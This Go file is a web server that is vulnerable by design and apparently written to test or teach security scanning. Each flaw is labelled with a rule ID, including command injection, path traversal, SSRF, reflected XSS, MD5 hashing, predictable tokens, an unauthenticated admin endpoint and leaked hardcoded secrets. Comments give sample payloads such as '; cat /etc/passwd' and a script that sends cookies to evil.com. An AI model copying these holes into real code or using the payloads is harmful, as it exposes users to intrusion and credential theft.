package main

import (
	"crypto/md5" //nolint
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// ❌ VULN [S6702 / S2068]: Hardcoded credentials & secrets
const (
	AdminAPIKey    = "sk-prod-9f8e7d6c5b4a3210feedbeef"
	JWTSecret      = "jwt-secret-do-not-share"
	AWSSecretKey   = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
	AWSAccessKeyID = "AKIAIOSFODNN7EXAMPLE"
	DBPassword     = "SuperSecret123!"
	DBConnString   = "postgres://admin:SuperSecret123!@localhost:5432/userdb?sslmode=disable"
)

// Simulated in-memory user store (pretending it's a real DB)
var users = map[string]string{
	"admin": "21232f297a57a5a743894a0e4a801fc3", // MD5 of "admin"
	"user1": "5f4dcc3b5aa765d61d8327deb882cf99", // MD5 of "password"
}

// ❌ VULN [S4790]: MD5 used for password hashing (weak cryptography)
func hashPassword(password string) string {
	h := md5.New()
	io.WriteString(h, password)
	return fmt.Sprintf("%x", h.Sum(nil))
}

// ❌ VULN [S2245]: math/rand used for security token (not cryptographically secure)
func generateSessionToken() string {
	rand.Seed(time.Now().UnixNano()) //nolint
	return fmt.Sprintf("sess-%016d", rand.Int63())
}

// ❌ VULN [S2245]: Predictable OTP / reset token
func generateResetOTP() string {
	rand.Seed(time.Now().UnixNano()) //nolint
	return fmt.Sprintf("%06d", rand.Intn(999999))
}

// ❌ VULN [S4721]: Command Injection — user input passed directly to shell
func diagnosticHandler(w http.ResponseWriter, r *http.Request) {
	host := r.URL.Query().Get("host")
	if host == "" {
		http.Error(w, "Missing 'host' parameter", http.StatusBadRequest)
		return
	}

	// Attacker can pass: "8.8.8.8; cat /etc/passwd"
	cmd := exec.Command("sh", "-c", "ping -c 1 "+host)
	out, err := cmd.CombinedOutput()
	if err != nil {
		// ❌ VULN [S4507]: Leaking internal error + command output to response
		http.Error(w, fmt.Sprintf("Command error: %v\nOutput: %s", err, string(out)), 500)
		return
	}
	fmt.Fprint(w, string(out))
}

// ❌ VULN [S6096]: Path Traversal — no input validation on file path
func fileReadHandler(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("file")

	// Attacker can pass: "../../etc/passwd"
	content, err := os.ReadFile("./uploads/" + filename)
	if err != nil {
		// ❌ VULN [S4507]: Leaking file system error details
		http.Error(w, fmt.Sprintf("File error: %v", err), http.StatusNotFound)
		return
	}
	fmt.Fprint(w, string(content))
}

// ❌ VULN [S5144]: SSRF — fetching arbitrary URL supplied by user
func fetchURLHandler(w http.ResponseWriter, r *http.Request) {
	targetURL := r.URL.Query().Get("url")
	if targetURL == "" {
		http.Error(w, "Missing 'url' parameter", http.StatusBadRequest)
		return
	}

	// Attacker can probe internal services: http://169.254.169.254/latest/meta-data/
	resp, err := http.Get(targetURL) //nolint
	if err != nil {
		http.Error(w, fmt.Sprintf("Fetch failed: %v", err), http.StatusBadRequest)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	w.Write(body) //nolint
}

// ❌ VULN [S5131]: XSS — reflecting user input directly in HTML without escaping
func searchHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("q")

	w.Header().Set("Content-Type", "text/html")
	// Attacker can inject: <script>document.location='http://evil.com?c='+document.cookie</script>
	fmt.Fprintf(w, `<html>
<head><title>Search</title></head>
<body>
  <h1>Search results for: %s</h1>
  <p>No results found.</p>
</body>
</html>`, query)
}

// ❌ VULN [S2245 + S4790]: Weak login using MD5 password hash + insecure token
func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")

	storedHash, exists := users[username]
	if !exists || storedHash != hashPassword(password) {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	// ❌ VULN [S2245]: Generating session token with insecure random
	token := generateSessionToken()
	http.SetCookie(w, &http.Cookie{
		Name:  "session",
		Value: token,
		Path:  "/",
		// ❌ VULN [S3330]: Missing Secure, HttpOnly flags
	})

	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status": "ok", "token": "%s", "user": "%s"}`, token, username)
}

// ❌ VULN [missing auth]: Admin endpoint with no authentication check
func adminDeleteUserHandler(w http.ResponseWriter, r *http.Request) {
	// No authentication, no authorization — anyone can call this
	userID := r.URL.Query().Get("id")
	if userID == "" {
		http.Error(w, "Missing 'id'", http.StatusBadRequest)
		return
	}

	delete(users, userID)

	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"message": "User '%s' has been deleted"}`, userID)
}

// ❌ VULN [S2245]: Password reset with predictable OTP
func resetPasswordHandler(w http.ResponseWriter, r *http.Request) {
	email := r.URL.Query().Get("email")

	otp := generateResetOTP()

	// ❌ VULN: OTP printed in logs AND returned in response (should only be sent by email)
	fmt.Printf("[RESET] OTP for %s: %s\n", email, otp)
	fmt.Fprintf(w, `{"otp": "%s", "email": "%s"}`, otp, email)
}

// ❌ VULN [S6540]: Health check leaking internal config & secrets
func healthHandler(w http.ResponseWriter, r *http.Request) {
	info := map[string]interface{}{
		"status":       "ok",
		"version":      "1.0.0",
		"db_conn":      DBConnString,  // Leaking DB password!
		"api_key":      AdminAPIKey,
		"jwt_secret":   JWTSecret,
		"aws_key":      AWSAccessKeyID,
		"aws_secret":   AWSSecretKey,
		"environment":  os.Getenv("ENV"),
		"go_path":      os.Getenv("GOPATH"),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(info)
}

// ❌ VULN [S5332]: Running plain HTTP server (no TLS)
// ❌ VULN [S5320]: No timeouts configured (DoS risk)
func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/health", healthHandler)
	mux.HandleFunc("/login", loginHandler)
	mux.HandleFunc("/search", searchHandler)
	mux.HandleFunc("/diagnostic", diagnosticHandler)
	mux.HandleFunc("/file", fileReadHandler)
	mux.HandleFunc("/fetch", fetchURLHandler)
	mux.HandleFunc("/admin/delete-user", adminDeleteUserHandler)
	mux.HandleFunc("/reset-password", resetPasswordHandler)

	addr := ":8080"
	fmt.Printf("[INFO] Server listening on http://0.0.0.0%s\n", addr)
	fmt.Printf("[INFO] DB: %s\n", DBConnString) // ❌ VULN: Logging connection string with password

	// No TLS, no timeouts = vulnerable by design
	if err := http.ListenAndServe(addr, mux); err != nil {
		fmt.Fprintf(os.Stderr, "Fatal: %v\n", err)
		os.Exit(1)
	}
}
